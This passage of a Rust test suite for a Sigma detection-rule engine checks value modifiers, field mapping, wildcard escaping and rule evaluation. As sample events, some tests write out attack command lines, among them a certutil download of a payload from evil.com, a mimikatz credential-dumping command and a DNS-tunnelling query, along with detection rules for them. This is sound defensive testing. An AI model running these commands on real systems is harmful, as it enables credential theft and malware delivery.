        // ─── Numeric comparison modifiers ───────────────────────────────

        #[test]
        fn gt_modifier() {
            let event = make_event(&[("score", "85")]);
            let cond = FieldCondition {
                field: "score".to_string(),
                field_folded: "score".to_string(),
                values: vec![SigmaValue::Integer(80)],
                values_folded: vec![Some("80".to_string())],
                values_match_cache: Vec::new(),
                modifiers: vec![ValueModifier::Gt],
            };
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn gt_modifier_equal_no_match() {
            let event = make_event(&[("score", "80")]);
            let cond = FieldCondition {
                field: "score".to_string(),
                field_folded: "score".to_string(),
                values: vec![SigmaValue::Integer(80)],
                values_folded: vec![Some("80".to_string())],
                values_match_cache: Vec::new(),
                modifiers: vec![ValueModifier::Gt],
            };
            assert!(!match_field_condition(&cond, &event));
        }

        #[test]
        fn gte_modifier() {
            let event = make_event(&[("score", "80")]);
            let cond = FieldCondition {
                field: "score".to_string(),
                field_folded: "score".to_string(),
                values: vec![SigmaValue::Integer(80)],
                values_folded: vec![Some("80".to_string())],
                values_match_cache: Vec::new(),
                modifiers: vec![ValueModifier::Gte],
            };
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn lt_modifier() {
            let event = make_event(&[("score", "5")]);
            let cond = FieldCondition {
                field: "score".to_string(),
                field_folded: "score".to_string(),
                values: vec![SigmaValue::Integer(10)],
                values_folded: vec![Some("10".to_string())],
                values_match_cache: Vec::new(),
                modifiers: vec![ValueModifier::Lt],
            };
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn lte_modifier() {
            let event = make_event(&[("score", "10")]);
            let cond = FieldCondition {
                field: "score".to_string(),
                field_folded: "score".to_string(),
                values: vec![SigmaValue::Integer(10)],
                values_folded: vec![Some("10".to_string())],
                values_match_cache: Vec::new(),
                modifiers: vec![ValueModifier::Lte],
            };
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn numeric_non_numeric_field_no_match() {
            let event = make_event(&[("score", "not_a_number")]);
            let cond = FieldCondition {
                field: "score".to_string(),
                field_folded: "score".to_string(),
                values: vec![SigmaValue::Integer(10)],
                values_folded: vec![Some("10".to_string())],
                values_match_cache: Vec::new(),
                modifiers: vec![ValueModifier::Gt],
            };
            assert!(!match_field_condition(&cond, &event));
        }

        // ─── Exists modifier ───────────────────────────────────────────

        #[test]
        fn exists_true_field_present() {
            let event = make_event(&[("cmd", "something")]);
            let cond = FieldCondition {
                field: "cmd".to_string(),
                field_folded: "cmd".to_string(),
                values: vec![SigmaValue::Boolean(true)],
                values_folded: vec![Some("true".to_string())],
                values_match_cache: Vec::new(),
                modifiers: vec![ValueModifier::Exists],
            };
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn exists_true_field_absent() {
            let event = make_event(&[("other", "something")]);
            let cond = FieldCondition {
                field: "cmd".to_string(),
                field_folded: "cmd".to_string(),
                values: vec![SigmaValue::Boolean(true)],
                values_folded: vec![Some("true".to_string())],
                values_match_cache: Vec::new(),
                modifiers: vec![ValueModifier::Exists],
            };
            assert!(!match_field_condition(&cond, &event));
        }

        #[test]
        fn exists_false_field_absent() {
            let event = make_event(&[("other", "something")]);
            let cond = FieldCondition {
                field: "cmd".to_string(),
                field_folded: "cmd".to_string(),
                values: vec![SigmaValue::Boolean(false)],
                values_folded: vec![Some("false".to_string())],
                values_match_cache: Vec::new(),
                modifiers: vec![ValueModifier::Exists],
            };
            assert!(match_field_condition(&cond, &event));
        }

        // ─── Windash modifier ──────────────────────────────────────────

        #[test]
        fn windash_modifier() {
            let event = make_event(&[("cmd", "cmd /c whoami")]);
            // Rule uses `-c` but windash adds `/c` variant
            let cond = make_condition(
                "cmd",
                &["-c"],
                &[ValueModifier::Windash, ValueModifier::Contains],
            );
            assert!(match_field_condition(&cond, &event));
        }

        // ─── Keyword search (empty field) ──────────────────────────────

        #[test]
        fn keyword_search_matches_any_field() {
            let event = make_event(&[
                ("field1", "normal value"),
                ("field2", "suspicious command here"),
            ]);
            let cond = make_condition("", &["suspicious"], &[ValueModifier::Contains]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn keyword_search_no_match() {
            let event = make_event(&[("field1", "normal value"), ("field2", "another normal")]);
            let cond = make_condition("", &["suspicious"], &[ValueModifier::Contains]);
            assert!(!match_field_condition(&cond, &event));
        }

        // ─── Null value matching ───────────────────────────────────────

        #[test]
        fn null_matches_empty_field() {
            let event = make_event(&[("field", "")]);
            let cond = FieldCondition {
                field: "field".to_string(),
                field_folded: "field".to_string(),
                values: vec![SigmaValue::Null],
                values_folded: vec![Some(String::new())],
                values_match_cache: Vec::new(),
                modifiers: vec![],
            };
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn null_no_match_nonempty() {
            let event = make_event(&[("field", "something")]);
            let cond = FieldCondition {
                field: "field".to_string(),
                field_folded: "field".to_string(),
                values: vec![SigmaValue::Null],
                values_folded: vec![Some(String::new())],
                values_match_cache: Vec::new(),
                modifiers: vec![],
            };
            assert!(!match_field_condition(&cond, &event));
        }

        // ─── Field case insensitivity ──────────────────────────────────

        #[test]
        fn field_name_case_insensitive() {
            let event = make_event(&[("CommandLine", "powershell.exe -enc")]);
            let cond = make_condition("commandline", &["-enc"], &[ValueModifier::Contains]);
            assert!(match_field_condition(&cond, &event));
        }

        // ─── Identifier AND/OR logic ───────────────────────────────────

        #[test]
        fn identifier_and_logic_across_conditions() {
            let event = make_event(&[("cmd", "powershell -enc AAAA"), ("user", "admin")]);
            let id = make_identifier(
                "sel",
                vec![
                    make_condition("cmd", &["-enc"], &[ValueModifier::Contains]),
                    make_condition("user", &["admin"], &[]),
                ],
            );
            // Both conditions must match (AND within group)
            assert!(match_identifier(&id, &event));
        }

        #[test]
        fn identifier_or_across_groups() {
            let event = make_event(&[("cmd", "calc.exe"), ("user", "admin")]);
            let id = SearchIdentifier {
                name: "sel".to_string(),
                groups: vec![
                    FieldConditionGroup {
                        conditions: vec![make_condition("cmd", &["powershell"], &[])],
                    },
                    FieldConditionGroup {
                        conditions: vec![make_condition("user", &["admin"], &[])],
                    },
                ],
            };
            // First group fails, second matches — OR across groups
            assert!(match_identifier(&id, &event));
        }

        // ─── Missing field ─────────────────────────────────────────────

        #[test]
        fn missing_field_no_match() {
            let event = make_event(&[("other_field", "value")]);
            let cond = make_condition("nonexistent", &["value"], &[]);
            assert!(!match_field_condition(&cond, &event));
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // FIELD MAPPING TESTS
    // ═════════════════════════════════════════════════════════════════════

    mod fieldmap_tests {
        use super::*;

        #[test]
        fn default_mapping_sysmon_fields() {
            let fm = FieldMapping::new();
            assert_eq!(fm.translate("CommandLine"), "command_line");
            assert_eq!(fm.translate("Image"), "image");
            assert_eq!(fm.translate("ParentImage"), "parent_image");
            assert_eq!(fm.translate("TargetFilename"), "target_filename");
            assert_eq!(fm.translate("DestinationIp"), "destination_ip");
        }

        #[test]
        fn mapping_case_insensitive() {
            let fm = FieldMapping::new();
            assert_eq!(fm.translate("commandline"), "command_line");
            assert_eq!(fm.translate("COMMANDLINE"), "command_line");
        }

        #[test]
        fn unmapped_passthrough() {
            let fm = FieldMapping::new();
            assert_eq!(fm.translate("custom_field"), "custom_field");
        }

        #[test]
        fn custom_mapping() {
            let mut fm = FieldMapping::new();
            fm.add_mapping("MyCustomField", "my_custom_field");
            assert_eq!(fm.translate("MyCustomField"), "my_custom_field");
        }

        #[test]
        fn enrich_event_adds_sigma_names() {
            let fm = FieldMapping::new();
            let mut event = HashMap::new();
            event.insert("command_line".to_string(), "powershell.exe".to_string());
            let enriched = fm.enrich_event(&event);
            // Should have both the original and the Sigma-canonical name
            assert_eq!(enriched.get("command_line").unwrap(), "powershell.exe");
            assert_eq!(enriched.get("commandline").unwrap(), "powershell.exe");
        }

        #[test]
        fn mapping_count() {
            let fm = FieldMapping::new();
            assert!(fm.len() > 50, "Should have 50+ default field mappings");
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // ENGINE INTEGRATION TESTS — Full rule evaluation
    // ═════════════════════════════════════════════════════════════════════

    mod engine_tests {
        use super::*;

        fn process_event(cmd: &str, image: &str) -> HashMap<String, String> {
            let mut event = HashMap::new();
            event.insert("command_line".to_string(), cmd.to_string());
            event.insert("image".to_string(), image.to_string());
            event.insert("event_category".to_string(), "process_creation".to_string());
            event.insert("event_product".to_string(), "windows".to_string());
            event
        }

        #[test]
        fn engine_load_and_evaluate_single_rule() {
            let yaml = r#"
title: Encoded PowerShell
level: high
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains:
            - '-enc'
            - '-encodedcommand'
        Image|endswith: '\powershell.exe'
    condition: selection
"#;

            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();
            assert_eq!(engine.rule_count(), 1);

            let event = process_event(
                "powershell.exe -enc SQBFAFgA",
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            );
            let matches = engine.evaluate_event(&event);
            assert_eq!(matches.len(), 1);
            assert_eq!(matches[0].rule_title, "Encoded PowerShell");
            assert_eq!(matches[0].rule_level, SeverityLevel::High);
            assert!(matches[0].score > 0.0);
        }

        #[test]
        fn engine_no_match_benign_event() {
            let yaml = r#"
title: Suspicious PowerShell
level: high
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: '-enc'
    condition: selection
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            let event = process_event("notepad.exe README.txt", "C:\\Windows\\notepad.exe");
            let matches = engine.evaluate_event(&event);
            assert!(matches.is_empty());
        }

        #[test]
        fn engine_selection_and_not_filter() {
            let yaml = r#"
title: Suspicious Process Creation
level: medium
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: 'whoami'
    filter:
        Image|endswith: '\cmd.exe'
    condition: selection and not filter
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            // Should match: whoami via powershell (not filtered)
            let event1 = process_event(
                "powershell -c whoami",
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            );
            assert_eq!(engine.evaluate_event(&event1).len(), 1);

            // Should NOT match: whoami via cmd.exe (filtered out)
            let event2 = process_event("whoami /priv", "C:\\Windows\\System32\\cmd.exe");
            assert!(engine.evaluate_event(&event2).is_empty());
        }

        #[test]
        fn engine_logsource_filtering() {
            let yaml = r#"
title: Windows Only Rule
level: medium
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: 'test'
    condition: selection
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            // Should match: correct logsource
            let mut event1 = HashMap::new();
            event1.insert("command_line".to_string(), "test command".to_string());
            event1.insert("event_category".to_string(), "process_creation".to_string());
            event1.insert("event_product".to_string(), "windows".to_string());
            assert_eq!(engine.evaluate_event(&event1).len(), 1);

            // Should NOT match: wrong product
            let mut event2 = HashMap::new();
            event2.insert("command_line".to_string(), "test command".to_string());
            event2.insert("event_category".to_string(), "process_creation".to_string());
            event2.insert("event_product".to_string(), "linux".to_string());
            assert!(engine.evaluate_event(&event2).is_empty());
        }

        #[test]
        fn engine_multiple_rules() {
            let yaml1 = r#"
title: Rule A
level: high
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: 'mimikatz'
    condition: selection
"#;
            let yaml2 = r#"
title: Rule B
level: medium
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: 'whoami'
    condition: selection
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml1).unwrap();
            engine.load_rule(yaml2).unwrap();
            assert_eq!(engine.rule_count(), 2);

            // Event matches only Rule A
            let event = process_event(
                "mimikatz.exe sekurlsa::logonpasswords",
                "C:\\temp\\mimikatz.exe",
            );
            let matches = engine.evaluate_event(&event);
            assert_eq!(matches.len(), 1);
            assert_eq!(matches[0].rule_title, "Rule A");
        }

        #[test]
        fn engine_batch_evaluation() {
            let yaml = r#"
title: Batch Test Rule
level: medium
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: 'suspicious'
    condition: selection
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            let events: Vec<HashMap<String, String>> = vec![
                process_event("normal command", "cmd.exe"),
                process_event("suspicious activity", "powershell.exe"),
                process_event("another normal", "notepad.exe"),
                process_event("very suspicious behavior", "evil.exe"),
            ];

            let results = engine.evaluate_batch(&events);
            assert_eq!(results.len(), 4);
            assert!(results[0].matches.is_empty());
            assert_eq!(results[1].matches.len(), 1);
            assert!(results[2].matches.is_empty());
            assert_eq!(results[3].matches.len(), 1);
        }

        #[test]
        fn engine_rule_with_tags() {
            let yaml = r#"
title: MITRE Tagged Rule
level: high
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: 'powershell'
    condition: selection
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            let event = process_event("powershell -c Get-Process", "powershell.exe");
            let matches = engine.evaluate_event(&event);
            assert_eq!(matches.len(), 1);
            assert!(matches[0].tags.contains(&"attack.execution".to_string()));
            assert!(matches[0].tags.contains(&"attack.t1059.001".to_string()));
        }

        #[test]
        fn engine_load_multi_document() {
            let yaml = r#"
title: Rule One
level: low
logsource:
    category: test
detection:
    sel:
        field: val1
    condition: sel
---
title: Rule Two
level: high
logsource:
    category: test
detection:
    sel:
        field: val2
    condition: sel
"#;
            let mut engine = SigmaEngine::new();
            let (successes, errors) = engine.load_rules(yaml);
            assert_eq!(successes.len(), 2);
            assert!(errors.is_empty());
            assert_eq!(engine.rule_count(), 2);
        }

        #[test]
        fn engine_rule_list() {
            let yaml = r#"
title: Test Rule Alpha
level: medium
logsource:
    category: test
detection:
    sel:
        field: value
    condition: sel
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();
            let list = engine.rule_list();
            assert_eq!(list.len(), 1);
            assert_eq!(list[0].1, "Test Rule Alpha");
        }

        #[test]
        fn engine_severity_scores() {
            for (level, min_score, max_score) in [
                ("informational", 0.0, 0.2),
                ("low", 0.2, 0.4),
                ("medium", 0.4, 0.6),
                ("high", 0.6, 0.8),
                ("critical", 0.8, 1.0),
            ] {
                let yaml = format!(
                    "title: Score Test\nlevel: {level}\nlogsource:\n    category: test\ndetection:\n    sel:\n        field: value\n    condition: sel\n"
                );
                let mut engine = SigmaEngine::new();
                engine.load_rule(&yaml).unwrap();

                let mut event = HashMap::new();
                event.insert("field".to_string(), "value".to_string());
                event.insert("event_category".to_string(), "test".to_string());
                let matches = engine.evaluate_event(&event);
                assert_eq!(matches.len(), 1, "No match for level: {level}");
                let score = matches[0].score;
                assert!(
                    score >= min_score && score <= max_score,
                    "Score {score} out of range [{min_score},{max_score}] for level: {level}"
                );
            }
        }

        // ─── Real-world Sigma rule patterns ────────────────────────────

        #[test]
        fn real_world_credential_dumping() {
            let yaml = r#"
title: Credential Dumping via Mimikatz
level: critical
tags:
    - attack.credential_access
    - attack.t1003.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_image:
        Image|endswith:
            - '\mimikatz.exe'
            - '\mimi.exe'
    selection_cmdline:
        CommandLine|contains:
            - 'sekurlsa'
            - 'kerberos::list'
            - 'crypto::certificates'
    condition: selection_image or selection_cmdline
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            // Match by image name
            let event1 = process_event("test", "C:\\Users\\attacker\\mimikatz.exe");
            assert_eq!(engine.evaluate_event(&event1).len(), 1);

            // Match by command line
            let event2 = process_event(
                "something.exe sekurlsa::logonpasswords",
                "C:\\temp\\renamed.exe",
            );
            assert_eq!(engine.evaluate_event(&event2).len(), 1);

            // No match
            let event3 = process_event("notepad.exe", "C:\\Windows\\notepad.exe");
            assert!(engine.evaluate_event(&event3).is_empty());
        }

        #[test]
        fn real_world_lolbin_certutil() {
            let yaml = r#"
title: Suspicious Certutil Usage
level: high
tags:
    - attack.defense_evasion
    - attack.t1140
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\certutil.exe'
        CommandLine|contains:
            - '-urlcache'
            - '-decode'
            - '-encode'
            - '-decodehex'
    filter:
        CommandLine|contains: '-verify'
    condition: selection and not filter
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            // Should match: suspicious certutil download
            let event1 = process_event(
                "certutil.exe -urlcache -f http://evil.com/payload.exe",
                "C:\\Windows\\System32\\certutil.exe",
            );
            assert_eq!(engine.evaluate_event(&event1).len(), 1);

            // Should NOT match: legitimate cert verification
            let event2 = process_event(
                "certutil.exe -verify -urlfetch cert.pem",
                "C:\\Windows\\System32\\certutil.exe",
            );
            assert!(engine.evaluate_event(&event2).is_empty());
        }

        #[test]
        fn real_world_dns_c2_detection() {
            let yaml = r#"
title: Suspicious DNS Query Length
level: medium
logsource:
    category: dns_query
    product: windows
detection:
    selection:
        QueryName|re: '.{50,}\..*'
    condition: selection
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            // Long subdomain (potential DNS tunneling)
            let mut event = HashMap::new();
            event.insert(
                "queryname".to_string(),
                "aGVsbG93b3JsZGhlbGxvd29ybGRoZWxsb3dvcmxkaGVsbG93b3JsZA.evil.com".to_string(),
            );
            event.insert("event_category".to_string(), "dns_query".to_string());
            event.insert("event_product".to_string(), "windows".to_string());
            assert_eq!(engine.evaluate_event(&event).len(), 1);

            // Normal query
            let mut event2 = HashMap::new();
            event2.insert("queryname".to_string(), "www.google.com".to_string());
            event2.insert("event_category".to_string(), "dns_query".to_string());
            event2.insert("event_product".to_string(), "windows".to_string());
            assert!(engine.evaluate_event(&event2).is_empty());
        }

        // ─── EvalScratch + match-cache regression guards ───────────────

        #[test]
        fn eval_scratch_ac_hits_do_not_bleed_across_events() {
            let yaml = r#"
title: AC Hit Bleed Guard
logsource: {}
detection:
    sel:
        CommandLine|contains: 'needle-unique-xyzzy'
    condition: sel
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            let mut hit = HashMap::new();
            hit.insert(
                "CommandLine".to_string(),
                "contains needle-unique-xyzzy here".to_string(),
            );
            assert_eq!(engine.evaluate_event_count(&hit), 1);

            let mut miss = HashMap::new();
            miss.insert(
                "CommandLine".to_string(),
                "benign chrome browsing".to_string(),
            );
            assert_eq!(
                engine.evaluate_event_count(&miss),
                0,
                "stale ac_hits must not carry pattern hits into the next event"
            );
        }

        #[test]
        fn eval_scratch_id_results_do_not_bleed_across_rules() {
            let rule_a = r#"
title: Rule A Many Idents
logsource: {}
detection:
    sel_a:
        CommandLine|contains: 'rule-a-marker'
    sel_b:
        Image|endswith: '\rulea.exe'
    sel_c:
        User: 'SYSTEM'
    sel_d:
        ParentImage|endswith: '\explorer.exe'
    sel_e:
        IntegrityLevel: 'High'
    condition: sel_a
"#;
            let rule_b = r#"
title: Rule B And Gate
logsource: {}
detection:
    sel_a:
        CommandLine|contains: 'rule-b-never'
    sel_b:
        Image|endswith: '\ruleb.exe'
    condition: sel_a and sel_b
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(rule_a).unwrap();
            engine.load_rule(rule_b).unwrap();

            let mut event = HashMap::new();
            event.insert(
                "CommandLine".to_string(),
                "rule-a-marker in command".to_string(),
            );
            event.insert("Image".to_string(), "C:\\Windows\\rulea.exe".to_string());
            event.insert("User".to_string(), "SYSTEM".to_string());
            event.insert(
                "ParentImage".to_string(),
                "C:\\Windows\\explorer.exe".to_string(),
            );
            event.insert("IntegrityLevel".to_string(), "High".to_string());

            let matches = engine.evaluate_event(&event);
            assert_eq!(
                matches.len(),
                1,
                "only Rule A should match; Rule B must not inherit stale id_results"
            );
            assert_eq!(matches[0].rule_title, "Rule A Many Idents");
        }

        #[test]
        fn match_cache_honors_case_folding_for_contains() {
            let yaml = r#"
title: Mixed Case Contains Cache
logsource: {}
detection:
    sel:
        CommandLine|contains: '-ENCodedCommand'
    condition: sel
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            let mut event = HashMap::new();
            event.insert(
                "CommandLine".to_string(),
                "powershell.exe -encodedcommand abc".to_string(),
            );
            assert_eq!(
                engine.evaluate_event_count(&event),
                1,
                "load-time cache must fold pattern before literal/contains matching"
            );
        }

        #[test]
        fn match_cache_honors_case_folding_for_wildcard_contains() {
            let yaml = r#"
title: Mixed Case Wildcard Cache
logsource: {}
detection:
    sel:
        Image|contains: 'TeSt*.exe'
    condition: sel
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            let mut event = HashMap::new();
            event.insert(
                "Image".to_string(),
                "C:\\Windows\\System32\\mytesttool.exe".to_string(),
            );
            assert_eq!(
                engine.evaluate_event_count(&event),
                1,
                "wildcard token cache must be built from fold_value, not raw YAML casing"
            );
        }

        #[test]
        fn event_view_value_cache_preserves_wildcard_and_literal_matches() {
            // Same event should match both a literal |contains and a wildcard
            // rule without re-case-folding semantics drifting.
            let literal = r#"
title: Literal Cache Path
logsource: {}
detection:
    sel:
        CommandLine|contains: '-ENC'
    condition: sel
"#;
            let wildcard = r#"
title: Wildcard Cache Path
logsource: {}
detection:
    sel:
        Image: '*\\PowerShell.EXE'
    condition: sel
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(literal).unwrap();
            engine.load_rule(wildcard).unwrap();

            let mut event = HashMap::new();
            event.insert(
                "CommandLine".to_string(),
                "powershell.exe -enc SQBFAFgA".to_string(),
            );
            event.insert(
                "Image".to_string(),
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".to_string(),
            );
            let matches = engine.evaluate_event(&event);
            assert_eq!(matches.len(), 2, "both cache paths must match");
        }

        #[test]
        fn event_view_value_cache_fieldref_uses_folded_values() {
            let yaml = r#"
title: FieldRef Fold Cache
logsource: {}
detection:
    sel:
        Image|fieldref|endswith: ParentImage
    condition: sel
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            let mut hit = HashMap::new();
            hit.insert("Image".to_string(), "C:\\Temp\\Tool.EXE".to_string());
            hit.insert("ParentImage".to_string(), "Tool.exe".to_string());
            assert_eq!(engine.evaluate_event_count(&hit), 1);

            let mut miss = HashMap::new();
            miss.insert("Image".to_string(), "C:\\Temp\\Tool.EXE".to_string());
            miss.insert("ParentImage".to_string(), "Other.exe".to_string());
            assert_eq!(engine.evaluate_event_count(&miss), 0);
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // WILDCARD MATCHING EDGE CASES
    // ═════════════════════════════════════════════════════════════════════

    mod wildcard_tests {
        use super::*;

        fn check_wildcard(pattern: &str, text: &str) -> bool {
            let event: HashMap<String, String> =
                [("f".to_string(), text.to_string())].into_iter().collect();
            let cond = FieldCondition {
                field: "f".to_string(),
                field_folded: "f".to_string(),
                values: vec![SigmaValue::String(pattern.to_string())],
                values_folded: vec![Some(pattern.to_lowercase())],
                values_match_cache: Vec::new(),
                modifiers: vec![],
            };
            match_field_condition(&cond, &event)
        }

        #[test]
        fn wildcard_star_matches_all() {
            assert!(check_wildcard("*", "anything"));
        }

        #[test]
        fn wildcard_star_matches_empty() {
            assert!(check_wildcard("*", ""));
        }

        #[test]
        fn wildcard_question_single_char() {
            assert!(check_wildcard("te?t", "test"));
            assert!(!check_wildcard("te?t", "teest"));
        }

        #[test]
        fn wildcard_prefix_star() {
            assert!(check_wildcard("*.exe", "cmd.exe"));
            assert!(!check_wildcard("*.exe", "cmd.bat"));
        }

        #[test]
        fn wildcard_suffix_star() {
            // Per Sigma escaping, backslash-before-wildcard must itself be
            // escaped: `C:\Windows\\*` = path prefix + active wildcard.
            assert!(check_wildcard("C:\\Windows\\\\*", "C:\\Windows\\System32"));
        }

        // ─── Sigma escaping rules (spec §Escaping) ───────────────────────

        /// `\*` is a LITERAL asterisk, not a wildcard.
        #[test]
        fn escaped_star_is_literal() {
            assert!(check_wildcard("\\*", "*"));
            assert!(!check_wildcard("\\*", "anything"));
        }

        /// `\?` is a LITERAL question mark, not a wildcard.
        #[test]
        fn escaped_question_is_literal() {
            assert!(check_wildcard("te\\?t", "te?t"));
            assert!(!check_wildcard("te\\?t", "test"));
        }

        /// `\\` unescapes to a single plain backslash.
        #[test]
        fn double_backslash_is_single_backslash() {
            assert!(check_wildcard("C:\\\\Windows", "C:\\Windows"));
        }

        /// A single backslash before a normal character is a plain backslash —
        /// Windows paths like `\cmd.exe` need no escaping.
        #[test]
        fn single_backslash_before_normal_char_preserved() {
            assert!(check_wildcard("\\cmd.exe", "\\cmd.exe"));
        }

        /// `\\*` = plain backslash followed by an ACTIVE wildcard, while
        /// `\*` alone is a literal asterisk (no wildcard behavior).
        #[test]
        fn escaped_backslash_then_active_wildcard() {
            // `dir\\*` in Sigma = literal `dir\` + wildcard
            assert!(check_wildcard("dir\\\\*", "dir\\anything"));
            // `dir\*` in Sigma = literal `dir*`
            assert!(check_wildcard("dir\\*", "dir*"));
            assert!(!check_wildcard("dir\\*", "dir\\anything"));
        }

        /// Escaped literals must survive the engine's AC prefilter end-to-end:
        /// the automaton has to hold the unescaped bytes.
        #[test]
        fn escaped_star_matches_through_engine_ac_path() {
            let yaml = r#"
title: Escaped Star Rule
logsource: {}
detection:
    sel:
        CommandLine|contains: '\*'
    condition: sel
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            let mut event = HashMap::new();
            event.insert("CommandLine".to_string(), "del *.log /q".to_string());
            assert_eq!(
                engine.evaluate_event(&event).len(),
                1,
                "Escaped `\\*` must match a literal asterisk via the AC path"
            );

            let mut event2 = HashMap::new();
            event2.insert("CommandLine".to_string(), "del logs /q".to_string());
            assert!(
                engine.evaluate_event(&event2).is_empty(),
                "Escaped `\\*` must NOT behave as a wildcard"
            );
        }

        #[test]
        fn wildcard_middle_star() {
            assert!(check_wildcard("cmd*exe", "cmd.exe"));
            assert!(check_wildcard("cmd*exe", "cmd_something.exe"));
        }

        #[test]
        fn wildcard_multiple_stars() {
            // Sigma escaping: backslash before `*` must be written `\\` to stay
            // a plain backslash — pattern is `*\\*\powershell.exe` in Sigma.
            assert!(check_wildcard(
                "*\\\\*\\powershell.exe",
                "C:\\Windows\\System32\\powershell.exe"
            ));
            // The unescaped form `*\*\powershell.exe` means: anything, then a
            // LITERAL asterisk, then `\powershell.exe` — must NOT match a path.
            assert!(!check_wildcard(
                "*\\*\\powershell.exe",
                "C:\\Windows\\System32\\powershell.exe"
            ));
        }

        #[test]
        fn no_wildcard_exact() {
            assert!(check_wildcard("exact", "exact"));
            assert!(!check_wildcard("exact", "not_exact"));
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // SEVERITY SCORE TESTS
    // ═════════════════════════════════════════════════════════════════════

    mod severity_tests {
        use super::*;

        #[test]
        fn severity_ordering() {
            let scores: Vec<f64> = [
                SeverityLevel::Informational,
                SeverityLevel::Low,
                SeverityLevel::Medium,
                SeverityLevel::High,
                SeverityLevel::Critical,
            ]
            .iter()
            .map(|s| s.to_score())
            .collect();

            for i in 1..scores.len() {
                assert!(
                    scores[i] > scores[i - 1],
                    "Severity scores not monotonically increasing"
                );
            }
        }

        #[test]
        fn severity_score_range() {
            for level in [
                SeverityLevel::Informational,
                SeverityLevel::Low,
                SeverityLevel::Medium,
                SeverityLevel::High,
                SeverityLevel::Critical,
            ] {
                let score = level.to_score();
                assert!(
                    (0.0..=1.0).contains(&score),
                    "Score {score} out of [0,1] range for {:?}",
                    level
                );
            }
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // AC PRE-FILTER CORRECTNESS TESTS
    //
    // These tests prove the Aho-Corasick optimisation never produces false
    // negatives. Each test loads a rule that mixes AC-eligible and
    // non-AC-eligible conditions, then verifies the engine still fires on
    // events that only satisfy the non-AC conditions.
    // ═════════════════════════════════════════════════════════════════════

    mod ac_prefilter_tests {
        use super::*;

        fn make_engine_with_rule(yaml: &str) -> SigmaEngine {
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();
            engine
        }

        /// `sel_regex OR sel_contains` condition: event matches via the regex identifier
        /// only — no AC-eligible pattern from sel_contains appears in the event.
        /// The pre-filter must not skip the rule; both identifiers must be evaluated.
        #[test]
        fn ac_prefilter_not_skipped_regex_or_contains() {
            let yaml = r#"
title: Regex OR Contains Pre-filter Test
level: high
logsource: {}
detection:
    sel_regex:
        CommandLine|re: 'powershell.*-enc'
    sel_contains:
        CommandLine|contains: 'mimikatz'
    condition: sel_regex or sel_contains
"#;
            let engine = make_engine_with_rule(yaml);

            // Matches via sel_regex only — "mimikatz" is NOT present
            let mut event = HashMap::new();
            event.insert(
                "command_line".to_string(),
                "powershell.exe -enc SQBFAFgA".to_string(),
            );
            let matches = engine.evaluate_event(&event);
            assert_eq!(
                matches.len(),
                1,
                "Rule must match via regex when AC patterns (mimikatz) are absent"
            );

            // Matches via sel_contains only
            let mut event2 = HashMap::new();
            event2.insert("command_line".to_string(), "mimikatz sekurlsa".to_string());
            assert_eq!(engine.evaluate_event(&event2).len(), 1);

            // No match
            let mut event3 = HashMap::new();
            event3.insert("command_line".to_string(), "notepad.exe".to_string());
            assert!(engine.evaluate_event(&event3).is_empty());
        }

        /// `|windash` is a transform modifier — the AC automaton holds the literal
        /// pattern `"-enc"` but the event contains the slash variant `"/enc"`.
        /// `is_ac_eligible` must exclude windash conditions from AC coverage so the
        /// rule is not incorrectly skipped when the dash variant is absent.
        #[test]
        fn ac_prefilter_not_skipped_windash_or_contains() {
            let yaml = r#"
title: Windash OR Contains Pre-filter Test
level: high
logsource: {}
detection:
    sel_windash:
        CommandLine|windash|contains: '-enc'
    sel_contains:
        CommandLine|contains: 'mimikatz'
